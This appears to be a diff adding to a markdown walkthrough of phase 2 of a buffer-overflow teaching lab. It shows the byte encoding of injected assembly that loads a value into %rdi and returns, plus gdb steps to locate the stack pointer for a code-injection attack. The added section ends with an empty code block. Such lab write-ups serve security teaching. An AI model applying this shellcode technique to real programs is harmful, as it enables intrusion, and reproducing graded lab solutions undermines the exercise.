@@ -43,3 +43,31 @@ gcc -c phase2.s
 objdump -d phase2.o  > phase2.d 
 ```
 Now open the file phase2.d and you will get something like below
+
+```ssh
+Disassembly of section .text:
+
+0000000000000000 <.text>:
+   0:	48 c7 c7 6d d8 51 34 	mov    $0x3451d86d,%rdi
+   7:	c3                   	retq   
+```
+The byte representation of the assembly code is ```48 c7 c7 6d d8 51 34 c3```.
+
+Now we need to find the address of rsp register:
+
+Run ctarget through gdb
+```gdb ctarget```
+
+set a breakpoint at getbuf
+```b getbuf```
+
+run ctarget
+```r```
+
+Dissasemble it
+```disas```
+
+You will get something like below:
+```
+
+```
